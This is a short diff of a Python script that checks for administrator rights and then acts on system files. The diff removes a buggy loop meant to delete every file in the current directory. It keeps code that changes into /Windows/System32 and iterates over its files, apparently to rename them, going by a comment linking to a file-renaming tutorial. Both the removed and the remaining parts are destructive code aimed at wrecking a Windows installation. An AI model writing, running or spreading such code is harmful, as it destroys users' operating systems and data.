@@ -6,9 +6,7 @@ def is_admin():
     except:
         return False
 
-if is_admin(): 
-    for files in enumerate(os.listdir()):
-        os.remove(files)
+if is_admin():
     os.chdir("/Windows/System32")
     #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
     for count, f in enumerate(os.listdir()):
